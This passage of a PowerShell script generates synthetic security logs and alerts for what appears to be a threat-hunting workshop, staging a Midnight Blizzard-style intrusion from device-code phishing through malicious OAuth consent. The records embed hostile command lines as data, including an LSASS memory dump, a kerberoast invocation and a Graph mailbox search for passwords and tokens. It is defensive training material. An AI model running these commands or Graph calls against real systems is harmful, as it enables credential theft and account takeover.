    AdditionalFields = '{"Technique":"T1566,T1078.004","ThreatActor":"MIDNIGHT BLIZZARD","Scenario":"Device code phishing"}'
}

foreach ($behaviorEntity in @(
        [pscustomobject]@{ EntityType = 'User'; Role = 'Impacted' }
        [pscustomobject]@{ EntityType = 'MailMessage'; Role = 'Related' }
    )) {
    Add-Record -Table 'BehaviorEntities' -Time $deviceCodeAlertTime -Values @{
        Timestamp = Format-WorkshopTime $deviceCodeAlertTime
        TimeGenerated = Format-WorkshopTime $deviceCodeAlertTime
        BehaviorId = $deviceCodeBehaviorId
        ActionType = 'DeviceCodeAuthenticationFromUnfamiliarLocation'
        Categories = 'InitialAccess'
        ServiceSource = 'Microsoft Defender XDR'
        DetectionSource = 'Behavior analytics'
        DataSources = 'SigninLogs,EmailEvents'
        EntityType = $behaviorEntity.EntityType
        EntityRole = $behaviorEntity.Role
        DetailedEntityRole = $behaviorEntity.EntityType
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountUpn = $victor.Upn
        RemoteIP = $externalIp
        RemoteUrl = $deviceLoginUrl
        NetworkMessageId = $phishNetworkMessageId
        EmailSubject = $phishSubject
        Application = $deviceCodeAppName
        MachineGroup = 'Workstations'
        AdditionalFields = '{"Technique":"T1566,T1078.004","ThreatActor":"MIDNIGHT BLIZZARD"}'
    }
}

Add-Record -Table 'AlertInfo' -Time $deviceCodeAlertTime -Values @{
    Timestamp = Format-WorkshopTime $deviceCodeAlertTime
    AlertId = $scenarioAlertIds.DeviceCodePhishing
    Title = 'Device code authentication following a phishing message'
    Category = 'InitialAccess'
    Severity = 'High'
    ServiceSource = 'Microsoft Defender XDR'
    DetectionSource = 'Microsoft Sentinel analytics'
    AttackTechniques = 'T1566,T1078.004,T1550.001'
}
Add-Record -Table 'AlertEvidence' -Time $deviceCodeAlertTime -Values @{
    Timestamp = Format-WorkshopTime $deviceCodeAlertTime
    AlertId = $scenarioAlertIds.DeviceCodePhishing
    Title = 'Device code authentication following a phishing message'
    Categories = '["InitialAccess"]'
    AttackTechniques = 'T1566,T1078.004,T1550.001'
    ServiceSource = 'Microsoft Defender XDR'
    DetectionSource = 'Microsoft Sentinel analytics'
    EntityType = 'User'
    EvidenceRole = 'Impacted'
    EvidenceDirection = 'Source'
    AccountName = $victor.Name
    AccountDomain = $adDomain
    AccountSid = $victor.Sid
    AccountObjectId = $victor.ObjectId
    AccountUpn = $victor.Upn
    RemoteIP = $externalIp
    RemoteUrl = $deviceLoginUrl
    Application = $deviceCodeAppName
    OAuthApplicationId = $deviceCodeAppId
    Severity = 'High'
    AdditionalFields = '{"ThreatActor":"MIDNIGHT BLIZZARD","Technique":"T1566,T1078.004,T1550.001","EvidenceTables":["EmailEvents","EmailUrlInfo","UrlClickEvents","SigninLogs","AADNonInteractiveUserSignInLogs","BehaviorInfo"]}'
}

# Zero-hour auto purge retroactively removed the lure once the campaign was classified,
# which is why the message is no longer in the mailbox during the investigation.
Add-Record -Table 'EmailPostDeliveryEvents' -Time $deviceCodeAlertTime.AddMinutes(6) -Values @{
    Timestamp = Format-WorkshopTime $deviceCodeAlertTime.AddMinutes(6)
    TimeGenerated = Format-WorkshopTime $deviceCodeAlertTime.AddMinutes(6)
    NetworkMessageId = $phishNetworkMessageId
    InternetMessageId = "<$(New-StableHex 'devicecode-phish-internet' 24)@$phishSenderDomain>"
    Action = 'Quarantine'
    ActionType = 'Phish ZAP'
    ActionTrigger = 'ZAP'
    ActionResult = 'Success'
    RecipientEmailAddress = $victor.Upn
    SenderFromAddress = $phishSenderAddress
    DeliveryLocation = 'Quarantine'
    SourceLocation = 'Inbox'
    EmailDirection = 'Inbound'
    ThreatTypes = 'Phish'
    DetectionMethods = 'Advanced filter'
    ReportId = '6005'
}

# The malicious application the stolen token is used to consent to in act 3.
Add-Record -Table 'OAuthAppInfo' -Time $StartTime.AddMinutes(5) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(5)
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(5)
    OAuthAppId = $maliciousOAuthAppId
    ServicePrincipalId = $maliciousOAuthSpId
    AppName = 'USAG Cyber Sync Helper'
    AddedOnTime = Format-WorkshopTime $StartTime.AddMinutes(4)
    LastModifiedTime = Format-WorkshopTime $StartTime.AddMinutes(6)
    LastUsedTime = Format-WorkshopTime $StartTime.AddMinutes(12)
    AppStatus = 'Enabled'
    VerifiedPublisher = @{ verifiedPublisherId = ''; displayName = ''; addedDateTime = '' }
    PrivilegeLevel = 'High'
    Permissions = [object[]]@('Mail.Read', 'Files.Read.All', 'Directory.ReadWrite.All', 'offline_access')
    ConsentedUsersCount = 1
    IsAdminConsented = $false
    AppOrigin = 'Custom'
    AppOwnerTenantId = $tenantId
    ReportId = '6006'
}

# ---------------------------------------------------------------------------
# Benign twin. Legitimate device code use by a platform engineer in the same window.
# Every field an analyst would pivot on differs: corporate address, compliant device,
# no risk, and a long history of the same behavior.
# ---------------------------------------------------------------------------
$benignDeviceCodeTime = $StartTime.AddMinutes(-52)
$benignDeviceCodeSignIn = @{
    Timestamp = Format-WorkshopTime $benignDeviceCodeTime
    TimeGenerated = Format-WorkshopTime $benignDeviceCodeTime
    CreatedDateTime = Format-WorkshopTime $benignDeviceCodeTime
    AADTenantId = $tenantId
    Application = $deviceCodeAppName
    ApplicationId = $deviceCodeAppId
    AppDisplayName = $deviceCodeAppName
    AppId = $deviceCodeAppId
    ResourceDisplayName = 'Windows Azure Service Management API'
    ResourceId = '797f4846-ba00-4fd7-ba43-dac1f8f63013'
    AccountDisplayName = $alice.DisplayName
    AccountObjectId = $alice.ObjectId
    AccountUpn = $alice.Upn
    UserPrincipalName = $alice.Upn
    UserDisplayName = $alice.DisplayName
    UserId = $alice.ObjectId
    Identity = $alice.DisplayName
    IPAddress = '198.51.100.50'
    Country = 'DE'
    State = 'Hesse'
    City = 'Wiesbaden'
    Location = 'DE'
    LogonType = 'deviceCode'
    AuthenticationProtocol = 'deviceCode'
    IncomingTokenType = 'none'
    ClientAppUsed = 'Mobile Apps and Desktop clients'
    ConditionalAccessStatus = 'success'
    AuthenticationRequirement = 'multiFactorAuthentication'
    DeviceTrustType = 'Azure AD joined'
    IsInteractive = $true
    IsManaged = $true
    IsCompliant = $true
    ResultType = '0'
    ResultDescription = 'Success'
    ErrorCode = 0
    RiskLevelDuringSignIn = 'none'
    RiskLevelAggregated = 'none'
    RiskState = 'none'
    RiskEventTypes = '[]'
    TokenIssuerType = 'AzureAD'
    UserAgent = 'AzureCLI/2.62.0 (MSI)'
    CorrelationId = New-StableGuid 'benign-devicecode-correlation'
    SessionId = New-StableGuid 'benign-devicecode-session'
    ReportId = 6201
    AdditionalFields = '{"Scenario":"Benign device code authentication","AnalystNote":"Corporate egress, compliant device, no risk, routine platform engineering use"}'
}
Add-Record -Table 'EntraIdSignInEvents' -Time $benignDeviceCodeTime -Values $benignDeviceCodeSignIn
Add-Record -Table 'AADSignInEventsBeta' -Time $benignDeviceCodeTime -Values $benignDeviceCodeSignIn

$signinTime = $StartTime
$signinCommon = @{
    Timestamp = Format-WorkshopTime $signinTime
    Application = 'Office 365'
    ApplicationId = '00000003-0000-0ff1-ce00-000000000000'
    LogonType = 'Interactive'
    ErrorCode = 0
    CorrelationId = New-StableGuid 'signin-correlation'
    SessionId = New-StableGuid 'signin-session'
    AccountDisplayName = $victor.DisplayName
    AccountObjectId = $victor.ObjectId
    AccountUpn = $victor.Upn
    IsExternalUser = 0
    IsGuestUser = $false
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResourceId = '00000002-0000-0ff1-ce00-000000000000'
    IPAddress = $externalIp
    Country = 'DE'
    State = 'Hesse'
    City = 'Frankfurt am Main'
    Latitude = '50.1109'
    Longitude = '8.6821'
    UserAgent = $browserUserAgent
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    DeviceTrustType = 'Unmanaged'
    RiskLevelDuringSignIn = 'high'
    RiskLevelAggregated = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = '["unfamiliarFeatures","anonymousIPAddress"]'
    AuthenticationRequirement = 'multiFactorAuthentication'
    TokenIssuerType = 'AzureAD'
    ReportId = 5801
}
Add-Record -Table 'EntraIdSignInEvents' -Time $signinTime -Values $signinCommon
Add-Record -Table 'AADSignInEventsBeta' -Time $signinTime -Values $signinCommon
Add-Record -Table 'SigninLogs' -Time $signinTime -Values @{
    TimeGenerated = Format-WorkshopTime $signinTime
    CreatedDateTime = Format-WorkshopTime $signinTime
    AADTenantId = $tenantId
    AppDisplayName = 'Office 365 Exchange Online'
    AppId = '00000002-0000-0ff1-ce00-000000000000'
    AuthenticationMethodsUsed = 'Password,SMS'
    AuthenticationRequirement = 'multiFactorAuthentication'
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    CorrelationId = New-StableGuid 'signin-correlation'
    DeviceDetail = @{ operatingSystem = 'Windows'; browser = 'Chrome'; isCompliant = $false; trustType = 'Unmanaged' }
    Id = New-StableGuid 'signin-log'
    Identity = $victor.DisplayName
    IPAddress = $externalIp
    IsInteractive = $true
    IsRisky = $true
    Location = 'DE'
    LocationDetails = @{ city = 'Frankfurt am Main'; state = 'Hesse'; countryOrRegion = 'DE'; geoCoordinates = @{ latitude = 50.1109; longitude = 8.6821 } }
    MfaDetail = '{"authMethod":"SMS","authDetail":"Temporary workshop MFA path"}'
    OperationName = 'Sign-in activity'
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResultType = '0'
    ResultDescription = 'Success'
    RiskLevel = 'high'
    RiskLevelDuringSignIn = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = 'unfamiliarFeatures,anonymousIPAddress'
    Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA completed by SMS' }
    Type = 'SigninLogs'
    UserAgent = $browserUserAgent
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    UserType = 'Member'
}

Add-Record -Table 'AADNonInteractiveUserSignInLogs' -Time $StartTime.AddMinutes(4) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(4)
    CreatedDateTime = Format-WorkshopTime $StartTime.AddMinutes(4)
    AADTenantId = $tenantId
    AppDisplayName = 'Microsoft Graph'
    AppId = '00000003-0000-0000-c000-000000000000'
    IPAddress = $externalIp
    IsInteractive = $false
    ResultType = '0'
    ResultDescription = 'Success'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    Type = 'AADNonInteractiveUserSignInLogs'
}

Add-Record -Table 'CloudAppEvents' -Time $StartTime.AddMinutes(5) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActionType = 'OAuthAppConsentGranted'
    Application = 'Microsoft 365'
    ApplicationId = '00000003-0000-0000-c000-000000000000'
    AccountObjectId = $victor.ObjectId
    AccountId = $victor.Upn
    AccountDisplayName = $victor.DisplayName
    IsAdminOperation = $false
    DeviceType = 'Windows'
    OSPlatform = 'Windows'
    IPAddress = $externalIp
    CountryCode = 'DE'
    City = 'Frankfurt am Main'
    UserAgent = $browserUserAgent
    ActivityType = 'Consent to application'
    ObjectName = 'USAG Cyber Sync Helper'
    ObjectType = 'OAuthApplication'
    ReportId = 5901
    AccountType = 'Regular'
    OAuthAppId = $maliciousOAuthAppId
    RawEventData = @{ ConsentType = 'User'; Scopes = 'Mail.Read Files.Read.All offline_access' }
    AdditionalFields = '{"Technique":"T1528","Scenario":"Suspicious OAuth consent","ThreatActor":"MIDNIGHT BLIZZARD"}'
}
Add-Record -Table 'AuditLogs' -Time $StartTime.AddMinutes(5) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActivityDateTime = Format-WorkshopTime $StartTime.AddMinutes(5)
    AADOperationType = 'Add'
    AADTenantId = $tenantId
    ActivityDisplayName = 'Consent to application'
    Category = 'ApplicationManagement'
    CorrelationId = New-StableGuid 'oauth-consent'
    Id = New-StableGuid 'audit-oauth'
    Identity = $victor.Upn
    InitiatedBy = @{ user = @{ userPrincipalName = $victor.Upn; id = $victor.ObjectId; ipAddress = $externalIp } }
    LoggedByService = 'Core Directory'
    OperationName = 'Consent to application'
    Result = 'success'
    ResultType = 'Success'
    TargetResources = @(@{ displayName = 'USAG Cyber Sync Helper'; type = 'ServicePrincipal'; id = $maliciousOAuthSpId })
    Type = 'AuditLogs'
}

Add-Record -Table 'AuditLogs' -Time $StartTime.AddMinutes(6) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(6)
    ActivityDateTime = Format-WorkshopTime $StartTime.AddMinutes(6)
    AADOperationType = 'Add'
    AADTenantId = $tenantId
    ActivityDisplayName = 'Add service principal credentials'
    AdditionalDetails = @(
        @{ key = 'Technique'; value = 'T1098.001' },
        @{ key = 'Scenario'; value = 'Service principal credential added after OAuth consent' },
        @{ key = 'ThreatActor'; value = 'MIDNIGHT BLIZZARD' }
    )
    Category = 'ApplicationManagement'
    CorrelationId = New-StableGuid 'sp-credential-add'
    Id = New-StableGuid 'audit-sp-credential'
    Identity = $victor.Upn
    InitiatedBy = @{ user = @{ userPrincipalName = $victor.Upn; id = $victor.ObjectId; ipAddress = $externalIp } }
    LoggedByService = 'Core Directory'
    OperationName = 'Add service principal credentials'
    Result = 'success'
    ResultType = 'Success'
    TargetResources = @(@{
        displayName = 'USAG Cyber Sync Helper'
        type = 'ServicePrincipal'
        id = $maliciousOAuthSpId
        modifiedProperties = @(
            @{ displayName = 'KeyDescription'; newValue = $maliciousOAuthKeyId; oldValue = '' },
            @{ displayName = 'AppId'; newValue = $maliciousOAuthAppId; oldValue = '' }
        )
    })
    Type = 'AuditLogs'
}

Add-Record -Table 'CloudAppEvents' -Time $StartTime.AddMinutes(6) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(6)
    ActionType = 'ServicePrincipalCredentialAdded'
    Application = 'Microsoft 365'
    AccountObjectId = $victor.ObjectId
    AccountId = $victor.Upn
    AccountDisplayName = $victor.DisplayName
    IsAdminOperation = $true
    DeviceType = 'Windows'
    OSPlatform = 'Windows'
    IPAddress = $externalIp
    CountryCode = 'DE'
    City = 'Frankfurt am Main'
    UserAgent = $browserUserAgent
    ActivityType = 'Add service principal credentials'
    ObjectName = 'USAG Cyber Sync Helper'
    ObjectType = 'ServicePrincipal'
    ObjectId = $maliciousOAuthSpId
    ReportId = 5902
    AccountType = 'Regular'
    OAuthAppId = $maliciousOAuthAppId
    RawEventData = @{ CredentialKeyId = $maliciousOAuthKeyId; Technique = 'T1098.001'; Persistence = 'Application credential' }
    AdditionalFields = '{"Technique":"T1098.001","Scenario":"OAuth service principal credential added","ThreatActor":"MIDNIGHT BLIZZARD"}'
}

Add-Record -Table 'AADServicePrincipalSignInLogs' -Time $StartTime.AddMinutes(6) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(6)
    CreatedDateTime = Format-WorkshopTime $StartTime.AddMinutes(6)
    AADTenantId = $tenantId
    AppId = $maliciousOAuthAppId
    AppOwnerTenantId = $tenantId
    ClientCredentialType = 'client secret'
    ConditionalAccessStatus = 'notApplied'
    CorrelationId = New-StableGuid 'sp-signin-correlation'
    Id = New-StableGuid 'sp-signin-log'
    Identity = 'USAG Cyber Sync Helper'
    IPAddress = $externalIp
    Location = 'DE'
    OperationName = 'Sign-in activity'
    ResourceDisplayName = 'Microsoft Graph'
    ResourceIdentity = '00000003-0000-0000-c000-000000000000'
    ResourceServicePrincipalId = '00000003-0000-0000-c000-000000000000'
    ResultDescription = 'Success'
    ResultType = '0'
    ServicePrincipalCredentialKeyId = $maliciousOAuthKeyId
    ServicePrincipalId = $maliciousOAuthSpId
    ServicePrincipalName = 'USAG Cyber Sync Helper'
    SessionId = New-StableGuid 'sp-signin-session'
    TenantId = $tenantId
    Type = 'AADServicePrincipalSignInLogs'
    UniqueTokenIdentifier = New-StableGuid 'sp-graph-token'
    UserAgent = $graphClientUserAgent
}

foreach ($offset in 7, 8, 9) {
    $requestUri = if ($offset -eq 7) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/messages" } elseif ($offset -eq 8) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/drive/root/children" } else { 'https://graph.microsoft.com/v1.0/users' }
    Add-Record -Table 'GraphAPIAuditEvents' -Time $StartTime.AddMinutes($offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($offset)
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($offset)
        IdentityProvider = 'AAD'
        ApiVersion = 'v1.0'
        ApplicationId = $maliciousOAuthAppId
        IpAddress = $externalIp
        ClientRequestId = New-StableGuid "client-graph-$offset"
        EntityType = 'user'
        ReportId = New-StableGuid "graph-report-$offset"
        RequestUri = $requestUri
        AccountObjectId = $victor.ObjectId
        OperationId = New-StableGuid "graph-op-$offset"
        Location = 'Germany West Central'
        RequestDuration = '143'
        RequestId = New-StableGuid "graph-request-$offset"
        RequestMethod = 'GET'
        ResponseStatusCode = '200'
        Scopes = 'Mail.Read Files.Read.All offline_access'
        UniqueTokenIdentifier = New-StableGuid "graph-token-$offset"
        TargetWorkload = if ($offset -eq 8) { 'Microsoft.FileServices' } elseif ($offset -eq 7) { 'Microsoft.People' } else { 'Microsoft.DirectoryServices' }
        ServicePrincipalId = $maliciousOAuthSpId
        ResponseSize = 40896
        TenantId = ''
        Type = 'GraphAPIAuditEvents'
        SourceSystem = ''
    }
    Add-Record -Table 'MicrosoftGraphActivityLogs' -Time $StartTime.AddMinutes($offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($offset)
        TenantId = $tenantId
        UserId = $victor.ObjectId
        AppId = $maliciousOAuthAppId
        IPAddress = $externalIp
        RequestMethod = 'GET'
        RequestUri = $requestUri.Replace('https://graph.microsoft.com', '')
        ResponseStatusCode = 200
        UserAgent = $graphClientUserAgent
        ServicePrincipalId = $maliciousOAuthSpId
        SignInActivityId = New-StableGuid 'signin-log'
        UniqueTokenId = New-StableGuid 'graph-token'
        Type = 'MicrosoftGraphActivityLogs'
    }
}

$graphAbuseRequests = @(
    [pscustomobject]@{ Offset = 10; Method = 'POST'; Uri = "https://graph.microsoft.com/v1.0/servicePrincipals/$maliciousOAuthSpId/addPassword"; Scopes = 'Application.ReadWrite.All Directory.ReadWrite.All'; Status = '201'; Workload = 'Microsoft.DirectoryServices'; ResponseSize = 2048 },
    [pscustomobject]@{ Offset = 11; Method = 'GET'; Uri = "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/messages?`$search=`"password OR secret OR token`""; Scopes = 'Mail.Read'; Status = '200'; Workload = 'Microsoft.People'; ResponseSize = 65536 },
    [pscustomobject]@{ Offset = 12; Method = 'GET'; Uri = 'https://graph.microsoft.com/v1.0/sites/root/drive/root/children'; Scopes = 'Files.Read.All Sites.Read.All'; Status = '200'; Workload = 'Microsoft.FileServices'; ResponseSize = 98304 }
)
foreach ($request in $graphAbuseRequests) {
    Add-Record -Table 'GraphAPIAuditEvents' -Time $StartTime.AddMinutes($request.Offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($request.Offset)
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($request.Offset)
        IdentityProvider = 'AAD'
        ApiVersion = 'v1.0'
        ApplicationId = $maliciousOAuthAppId
        IpAddress = $externalIp
        ClientRequestId = New-StableGuid "client-graph-abuse-$($request.Offset)"
        EntityType = 'servicePrincipal'
        ReportId = New-StableGuid "graph-abuse-report-$($request.Offset)"
        RequestUri = $request.Uri
        AccountObjectId = $victor.ObjectId
        OperationId = New-StableGuid "graph-abuse-op-$($request.Offset)"
        Location = 'Germany West Central'
        RequestDuration = '312'
        RequestId = New-StableGuid "graph-abuse-request-$($request.Offset)"
        RequestMethod = $request.Method
        ResponseStatusCode = $request.Status
        Scopes = $request.Scopes
        UniqueTokenIdentifier = New-StableGuid "graph-abuse-token-$($request.Offset)"
        TargetWorkload = $request.Workload
        ServicePrincipalId = $maliciousOAuthSpId
        ResponseSize = $request.ResponseSize
        TenantId = ''
        Type = 'GraphAPIAuditEvents'
        SourceSystem = ''
    }
    Add-Record -Table 'MicrosoftGraphActivityLogs' -Time $StartTime.AddMinutes($request.Offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($request.Offset)
        TenantId = $tenantId
        UserId = $victor.ObjectId
        AppId = $maliciousOAuthAppId
        IPAddress = $externalIp
        RequestMethod = $request.Method
        RequestUri = $request.Uri.Replace('https://graph.microsoft.com', '')
        ResponseStatusCode = [int]$request.Status
        ResponseSizeBytes = [int]$request.ResponseSize
        Scopes = $request.Scopes
        UserAgent = $graphClientUserAgent
        ServicePrincipalId = $maliciousOAuthSpId
        SignInActivityId = New-StableGuid 'sp-signin-log'
        UniqueTokenId = New-StableGuid "graph-abuse-token-$($request.Offset)"
        Type = 'MicrosoftGraphActivityLogs'
    }
}

$alerts = @(
    [pscustomobject]@{ Id = $scenarioAlertIds.OAuthPersistence; Offset = 6; Title = 'Suspicious OAuth service principal persistence'; Category = 'Persistence'; Severity = 'High'; Source = 'Microsoft Defender XDR'; Technique = 'T1528,T1098.001,T1550.001'; Entity = 'OAuthApplication'; File = ''; Command = 'USAG Cyber Sync Helper service principal credential added and used for Microsoft Graph' },
    [pscustomobject]@{ Id = $scenarioAlertIds.PowerShellCredentialDiscovery; Offset = 15; Title = 'Suspicious PowerShell credential discovery'; Category = 'CredentialAccess'; Severity = 'Medium'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1552.002'; Entity = 'Process'; File = 'powershell.exe'; Command = 'collect-reg-creds.ps1' },
    [pscustomobject]@{ Id = $scenarioAlertIds.Kerberoasting; Offset = 35; Title = 'Suspected Kerberoasting activity'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Identity'; Technique = 'T1558.003'; Entity = 'User'; File = "$toolRu.exe"; Command = "$toolRu.exe kerberoast" },
    [pscustomobject]@{ Id = $scenarioAlertIds.LsassDump; Offset = 50; Title = "Credential dumping from $targetLs"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'File'; File = "$targetLsLower.dmp"; Command = "$toolProc.exe -ma $targetLsLower.exe" },
    [pscustomobject]@{ Id = $scenarioAlertIds.PasswordStoreHarvesting; Offset = 65; Title = 'Password store harvesting tool observed'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1555'; Entity = 'Process'; File = "$toolLa.exe"; Command = "$toolLa.exe all" },
    [pscustomobject]@{ Id = $scenarioAlertIds.CredentialDumpingTool; Offset = 73; Title = "$toolMi credential dumping"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'Process'; File = "$($toolMi.ToLower()).exe"; Command = $secretVerb }
)
foreach ($alert in $alerts) {
    $time = $StartTime.AddMinutes($alert.Offset)
    Add-Record -Table 'AlertInfo' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Category = $alert.Category
        Severity = $alert.Severity
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        AttackTechniques = $alert.Technique
    }
    Add-Record -Table 'AlertEvidence' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Categories = "[`"$($alert.Category)`"]"
        AttackTechniques = $alert.Technique
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        EntityType = $alert.Entity
        EvidenceRole = 'Impacted'
        EvidenceDirection = 'Source'
        FileName = $alert.File
        FolderPath = if ($alert.File) { "$stage\$($alert.File)" } else { '' }
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountUpn = $victor.Upn
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        LocalIP = $win04.IP
        Application = if ($alert.Entity -eq 'OAuthApplication') { 'USAG Cyber Sync Helper' } else { '' }
        OAuthApplicationId = if ($alert.Entity -eq 'OAuthApplication') { $maliciousOAuthAppId } else { '' }
        ProcessCommandLine = $alert.Command
        AdditionalFields = "{`"ThreatActor`":`"MIDNIGHT BLIZZARD`",`"Technique`":`"$($alert.Technique)`"}"
        Severity = $alert.Severity
    }
}

$scenarioCorrelationAlerts = @(
    [pscustomobject]@{
        AlertId = $scenarioAlertIds.CorrelationOAuthGraph
        Offset = 6
        Title = 'OAuth application credential added and used for Graph access'
        Category = 'Persistence'
        Severity = 'High'
        ServiceSource = 'Microsoft Defender XDR'
        DetectionSource = 'Microsoft Sentinel analytics'
        AttackTechniques = 'T1528,T1098.001,T1550.001'
        EntityType = 'OAuthApplication'
        Device = $win04
        Account = $victor
        FileName = ''
        FolderPath = ''
        Command = 'USAG Cyber Sync Helper service-principal credential added and used for Microsoft Graph'
        Application = 'USAG Cyber Sync Helper'
        OAuthApplicationId = $maliciousOAuthAppId
        AdditionalFields = '{"Scenario":"OAuth persistence and Graph access","ServicePrincipal":"USAG Cyber Sync Helper","EvidenceTables":["CloudAppEvents","AuditLogs","AADServicePrincipalSignInLogs","GraphAPIAuditEvents","MicrosoftGraphActivityLogs"]}'
    },
    [pscustomobject]@{
        AlertId = $scenarioAlertIds.CorrelationCredentialCollection
        Offset = 50
        Title = 'Credential material collection on one endpoint'
        Category = 'CredentialAccess'
        Severity = 'High'
        ServiceSource = 'Microsoft Defender for Endpoint'
        DetectionSource = 'Microsoft Sentinel analytics'
        AttackTechniques = 'T1003.001,T1552.002,T1555,T1558.003'
        EntityType = 'Device'
        Device = $win04
        Account = $victor
        FileName = "$targetLsLower.dmp"
        FolderPath = "$stage\$targetLsLower.dmp"
        Command = "$toolProc.exe -ma $targetLsLower.exe"
        Application = ''
        OAuthApplicationId = ''
        AdditionalFields = '{"Scenario":"Endpoint credential material collection","EvidencePath":"C:\\ProgramData\\wrstage","SupportingTables":["DeviceProcessEvents","DeviceFileEvents","DeviceRegistryEvents","DeviceTvmSoftwareEvidenceBeta","DeviceTvmSecureConfigurationAssessment"]}'
    },
    [pscustomobject]@{
        AlertId = $scenarioAlertIds.CorrelationHybridIdentity
        Offset = 82
        Title = 'Service account interactive sign-in to identity synchronization server'
        Category = 'LateralMovement'
        Severity = 'High'
        ServiceSource = 'Microsoft Defender XDR'
        DetectionSource = 'Microsoft Sentinel analytics'
        AttackTechniques = 'T1078.002,T1021.006'
        EntityType = 'User'
        Device = $aadc
        Account = $svcSql
        FileName = ''
        FolderPath = ''
        Command = 'svc_sql RemoteInteractive logon to AADCONNECT01 from WIN11-04'
        Application = ''
        OAuthApplicationId = ''
        AdditionalFields = '{"Scenario":"Hybrid identity pivot","SourceDevice":"WIN11-04.usag-cyber.local","TargetDevice":"AADCONNECT01.usag-cyber.local","SupportingTables":["DeviceLogonEvents","IdentityLogonEvents","DeviceTvmSoftwareInventory","DeviceTvmSecureConfigurationAssessment"]}'
    }
)
foreach ($correlationAlert in $scenarioCorrelationAlerts) {
    Add-WorkshopScenarioCorrelationAlert `
        -AlertId $correlationAlert.AlertId `
        -Time $StartTime.AddMinutes($correlationAlert.Offset) `
        -Title $correlationAlert.Title `
        -Category $correlationAlert.Category `
        -Severity $correlationAlert.Severity `
        -ServiceSource $correlationAlert.ServiceSource `
        -DetectionSource $correlationAlert.DetectionSource `
        -AttackTechniques $correlationAlert.AttackTechniques `
        -EntityType $correlationAlert.EntityType `
        -DeviceId $correlationAlert.Device.DeviceId `
        -DeviceName $correlationAlert.Device.Name `
        -AccountName $correlationAlert.Account.Name `
        -AccountDomain $adDomain `
        -AccountSid $correlationAlert.Account.Sid `
        -AccountObjectId $correlationAlert.Account.ObjectId `
        -AccountUpn $correlationAlert.Account.Upn `
        -FileName $correlationAlert.FileName `
        -FolderPath $correlationAlert.FolderPath `
        -ProcessCommandLine $correlationAlert.Command `
        -Application $correlationAlert.Application `
        -OAuthApplicationId $correlationAlert.OAuthApplicationId `
        -AdditionalFields $correlationAlert.AdditionalFields
}

$linuxAdminUser = $alice.Name -replace '\.', ''
$linuxExternalIp = '203.0.113.91'
$linuxAlertTime = $StartTime.AddMinutes(68)
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(61) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(61)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'LogonFailed'
    LogonType = 'Ssh'
    Protocol = 'Ssh'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    RemoteIP = $linuxExternalIp
    RemoteDeviceName = 'unknown-internet-host'
    IsLocalAdmin = $false
    LogonId = 860061
    ReportId = 860061
    AdditionalFields = '{"SourceLog":"/var/log/auth.log","PamResult":"authentication failure","Scenario":"Linux SSH brute force"}'
}
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(64) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(64)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'LogonSuccess'
    LogonType = 'Ssh'
    Protocol = 'Ssh'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    RemoteIP = '10.42.30.10'
